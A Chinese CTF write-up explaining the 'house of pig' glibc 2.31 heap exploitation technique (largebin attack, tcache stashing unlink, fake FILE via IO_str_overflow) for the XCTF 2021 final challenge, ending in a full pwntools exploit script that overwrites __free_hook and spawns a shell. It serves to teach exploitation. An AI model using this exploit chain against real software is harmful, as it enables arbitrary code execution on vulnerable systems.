> 原文链接: https://www.anquanke.com//post/id/242640 


# house of pig一个新的堆利用详解


                                阅读量   
                                **242697**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">6</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



### [![](https://p5.ssl.qhimg.com/t01240c8e5a95db96cb.jpg)](https://p5.ssl.qhimg.com/t01240c8e5a95db96cb.jpg)



## 0x01 简述：

本利用方式应用于xctf 2021 final同名题目，该攻击方式适用于 libc 2.31及以后的新版本 libc，本质上是通过 libc2.31 下的 `largebin attack`以及 `FILE 结构`利用，来配合 libc2.31 下的 `tcache stashing unlink attack` 进行组合利用的方法。主要适用于程序中仅有 `calloc 函数`来申请 chunk，而没有调用 `malloc 函数`的情况。（因为 calloc 函数会跳过 tcache，无法完成常规的 tcache attack 等利用，同时，因为程序中没有 malloc 函数也无法在正常的 `tcache stashing unlink attack` 之后，将放入 tcache 中的 fake chunk 给申请出来 ）。

该方法最为核心的地方在于，利用了 glibc 中 `IO_str_overflow` 函数内会连续调用 malloc 、memcpy、free 函数的特点，并且这三个函数的参数都可以由 FILE 结构内的数据来控制。

关于libc2.31 下的 largebin attack 的手法可以参考：[largebin_attack](https://www.anquanke.com/post/id/189848)，不过 libc2.29 之后的 libc 将原本的两条利用路径修补了一条，所以只有一条路径可以完成该攻击了。该攻击的最终效果是可以往任意地址写一个当前 largebin 堆块的堆地址。

关于libc2.31 下的 tcache stashing unlink attack 的细节详见：[tcache_stashing_unlink_attack](https://www.anquanke.com/post/id/198173)，该攻击的最终效果有两个，我们这里使用的是该攻击可以将任意目标 fake chunk 放入 tcache 链表头部的效果特性。



## 0x02 利用条件：

至少存在 UAF 漏洞。



## 0x03 利用思路：

1、先用 UAF 漏洞泄露 libc 地址 和 heap 地址。

2、再用 UAF 修改 largebin 内 chunk 的 fd_nextsize 和 bk_nextsize 位置，完成一次 `largebin attack`，将一个堆地址写到 `__free_hook-0x8` 的位置，使得满足之后的 tcache stashing unlink attack 需要目标 fake chunk 的 bk 位置内地址可写的条件。

3、先构造同一大小的 5个 tcache，继续用 UAF 修改该大小的 smallbin 内 chunk 的 fd 和 bk 位置，完成一次 `tcache stashing unlink attack`。由于前一步已经将一个可写的堆地址，写到了`__free_hook-0x8`，所以可以将 __free_hook-0x10 的位置当作一个 fake chunk，放入到 tcache 链表的头部。但是由于没有 `malloc 函数`，我们无法将他申请出来。

4、最后再用UAF 修改 largebin 内 chunk 的 fd_nextsize 和 bk_nextsize 位置，完成第二次 `largebin attack`，将一个堆地址写到 `_IO_list_all` 的位置，从而在程序退出前 flush 所有 IO 流的时候，将该堆地址当作一个 FILE 结构体，我们就能在该堆地址的位置来构造任意 FILE结构了。

5、在该堆地址构造 FILE 结构的时候，重点是将其 vtable 由 _IO_file_jumps 修改为 _IO_str_jumps，那么当原本应该调用 IO_file_overflow 的时候，就会转而调用如下的 IO_str_overflow。而该函数是以传入的 FILE 地址本身为参数的，同时其中会连续调用 malloc、memcpy、free 函数（如下图），且三个函数的参数又都可以被该 FILE 结构中的数据控制。那么适当的构造 FILE 结构中的数据，就可以实现利用 IO_str_overflow 函数中的 `malloc` 申请出那个已经被放入到 tcache 链表的头部的包含 `__free_hook` 的 fake chunk；紧接着可以将提前在堆上布置好的数据，通过 IO_str_overflow 函数中的`memcpy` 写入到刚刚申请出来的包含`__free_hook`的这个 chunk，从而能任意控制 `__free_hook` ，这里可以将其修改为 system函数地址；最后调用 IO_str_overflow 函数中的 `free` 时，就能够触发 __free_hook ，同时还能在提前布置堆上数据的时候，使其以字符串 “/bin/sh\x00” 开头，那么最终就会执行 system(“/bin/sh”)。

[![](https://p1.ssl.qhimg.com/t012d5dfc2cc6ca71b9.png)](https://p1.ssl.qhimg.com/t012d5dfc2cc6ca71b9.png)<br>[![](https://p3.ssl.qhimg.com/t013bff2b8a70730476.png)](https://p3.ssl.qhimg.com/t013bff2b8a70730476.png)



## 0x04 例题分析：

这里以 xctf final 的 house_of_pig 题目为例，题目是当时 2020年下半年的时候，就给 xctf final 出好了的，只不过没想到比赛拖到了 2021年 才办，所以题目使用的是当时最新的 libc2.31。由于一开始想考察的是 trick 本身，为了减少堆布局的复杂度，还在 add 的时候给了一个 01dwang gift ，结果由于条件限制的不严格，也导致了其他的非预期解法，没有给师傅们很好的比赛体验，深表歉意。不过比赛中获得 1 血的队伍 Nu1l 是正解，也算是这个 trick 没有浪费。

另外需要说明的是，星盟的[ha1vk](https://www.anquanke.com/member/146878)师傅用的 `house of banana` 也是一种优秀的解法，不过需要适当爆破 rtld_global_ptr 的位置，并且触发的条件需要满足如下两个之一：
1. 程序显式调用 exit。
1. 程序能通过主函数返回。
而 `house of pig`的触发条件就是调用 `_IO_flush_all_lockp`的条件，即需要满足如下三个之一：
1. 当 libc 执行abort流程时。
1. 程序显式调用 exit 。
1. 程序能通过主函数返回。
相对来说触发的条件稍微宽松一点点。（感觉下次可以再出个题目，程序中不去显式调用 exit ，也不能通过主函数返回，只能去破坏堆结构导致 libc 的 abort，从而考察`house of pig`，2333）。



### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%EF%BC%9A"></a>漏洞：

程序中有三个角色 Peppa、Daddy、Mummy，每个角色都有各自的堆块管理列表和各自的 Add、View、Edit、Delete 函数。Peppa的堆块是每隔0x30中的前 0x10个字节可以被写一次，Mummy的堆块是每隔0x30中的中间 0x10个字节可以被写一次，Daddy的堆块是每隔0x30中的后 0x10个字节可以被写一次。

正常来说，需要知道每个角色的密码，才能通过对应密码 md5 的比较判断，但是这里判断用的 strncmp，且其中有个 md5 值中的包含 ‘\x00’ ，所以实际上会提前截断，而以 ‘\x3c\x44\x00’ 开头的md5，对应的原值其实是有很多的，所以这里可以任意切换角色。

[![](https://p0.ssl.qhimg.com/t01fe6f1af6a248bdce.png)](https://p0.ssl.qhimg.com/t01fe6f1af6a248bdce.png)

真正的核心漏洞是在每个角色的 Delete功能中，存在`UAF漏洞`。

[![](https://p4.ssl.qhimg.com/t010c23beebb39a9bdd.png)](https://p4.ssl.qhimg.com/t010c23beebb39a9bdd.png)

每个角色被切换的时候会调用saved函数，下一次被切换回来的时候又会调用recover来恢复，由于在saved中没有保存 flag 标志位，所以切换回来一次之后，就能用这个`UAF漏洞`来任意读取或者写入堆块了，但是不能double free。



### <a class="reference-link" name="%E5%88%A9%E7%94%A8%EF%BC%9A"></a>利用：

由于每个角色的 Add 功能都是用 `calloc` 来申请chunk 的，而 calloc 会跳过 tcache，所以无法使用 tcache attack；并且申请的chunk 至少要大于 0x90，所以也不能用 fastbin attack。

这里就需要利用我们的 `house of pig`。详见 exp

```
from pwn import *

context.log_level = 'debug'

io = process('./pig')
# io = remote('182.92.203.154', 35264)
elf = ELF('./pig')
libc = elf.libc

rl = lambda    a=False        : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
rn = lambda x            : io.recvn(x)
sn = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b            : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
irt = lambda            : io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s            : log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data        : u32(data.ljust(4, '\x00'))
uu64 = lambda data        : u64(data.ljust(8, '\x00'))


def Menu(cmd):
    sla('Choice: ', str(cmd))

def Add(size, content):
    Menu(1)
    sla('size: ', str(size))
    sla('message: ', content)

def Show(idx):
    Menu(2)
    sla('index: ', str(idx))

def Edit(idx, content):
    Menu(3)
    sla('index: ', str(idx))
    sa('message: ', content)

def Del(idx):
    Menu(4)
    sla('index: ', str(idx))

def Change(user):
    Menu(5)
    if user == 1:
        sla('user:\n', 'A\x01\x95\xc9\x1c')
    elif user == 2:
        sla('user:\n', 'B\x01\x87\xc3\x19')
    elif user == 3:
        sla('user:\n', 'C\x01\xf7\x3c\x32')


#----- prepare tcache_stashing_unlink_attack
Change(2)
for x in xrange(5):
    Add(0x90, 'B'*0x28) # B0~B4
    Del(x)    # B0~B4

Change(1)
Add(0x150, 'A'*0x68) # A0
for x in xrange(7):
    Add(0x150, 'A'*0x68) # A1~A7
    Del(1+x)
Del(0)

Change(2)
Add(0xb0, 'B'*0x28) # B5 split 0x160 to 0xc0 and 0xa0

Change(1)
Add(0x180, 'A'*0x78) # A8
for x in xrange(7):
    Add(0x180, 'A'*0x78) # A9~A15
    Del(9+x)
Del(8)

Change(2)
Add(0xe0, 'B'*0x38) # B6 split 0x190 to 0xf0 and 0xa0

#----- leak libc_base and heap_base
Change(1)
Add(0x430, 'A'*0x158) # A16

Change(2)
Add(0xf0, 'B'*0x48) # B7

Change(1)
Del(16)

Change(2)
Add(0x440, 'B'*0x158) # B8

Change(1)
Show(16)
ru('message is: ')
libc_base = uu64(rl()) - 0x1ebfe0
lg('libc_base')

Edit(16, 'A'*0xf+'\n')
Show(16)
ru('message is: '+'A'*0xf+'\n')
heap_base = uu64(rl()) - 0x13940
lg('heap_base')


#----- first largebin_attack
Edit(16, 2*p64(libc_base+0x1ebfe0) + '\n') # recover
Add(0x430, 'A'*0x158) # A17
Add(0x430, 'A'*0x158) # A18
Add(0x430, 'A'*0x158) # A19

Change(2)
Del(8)
Add(0x450, 'B'*0x168) # B9

Change(1)
Del(17)

Change(2)
free_hook = libc_base + libc.sym['__free_hook']
Edit(8, p64(0) + p64(free_hook-0x28) + '\n')

Change(3)
Add(0xa0, 'C'*0x28) # C0 triger largebin_attack, write a heap addr to __free_hook-8

Change(2)
Edit(8, 2*p64(heap_base+0x13e80) + '\n') # recover

#----- second largebin_attack
Change(3)
Add(0x380, 'C'*0x118) # C1

Change(1)
Del(19)

Change(2)
IO_list_all = libc_base + libc.sym['_IO_list_all']
Edit(8, p64(0) + p64(IO_list_all-0x20) + '\n')

Change(3)
Add(0xa0, 'C'*0x28) # C2 triger largebin_attack, write a heap addr to _IO_list_all

Change(2)
Edit(8, 2*p64(heap_base+0x13e80) + '\n') # recover

#----- tcache_stashing_unlink_attack and FILE attack
Change(1)
payload = 'A'*0x50 + p64(heap_base+0x12280) + p64(free_hook-0x20)
Edit(8, payload + '\n')

Change(3)
payload = '\x00'*0x18 + p64(heap_base+0x147c0)
payload = payload.ljust(0x158, '\x00')
Add(0x440, payload) # C3 change fake FILE _chain
Add(0x90, 'C'*0x28) # C4 triger tcache_stashing_unlink_attack, put the chunk of __free_hook into tcache

IO_str_vtable = libc_base + 0x1ED560
system_addr = libc_base + libc.sym['system']
fake_IO_FILE = 2*p64(0)
fake_IO_FILE += p64(1)                    #change _IO_write_base = 1
fake_IO_FILE += p64(0xffffffffffff)        #change _IO_write_ptr = 0xffffffffffff
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(heap_base+0x148a0)                #v4
fake_IO_FILE += p64(heap_base+0x148b8)                #v5
fake_IO_FILE = fake_IO_FILE.ljust(0xb0, '\x00')
fake_IO_FILE += p64(0)                    #change _mode = 0
fake_IO_FILE = fake_IO_FILE.ljust(0xc8, '\x00')
fake_IO_FILE += p64(IO_str_vtable)        #change vtable
payload = fake_IO_FILE + '/bin/sh\x00' + 2*p64(system_addr)
sa('Gift:', payload)


Menu(5)
sla('user:\n', '')

irt()
```
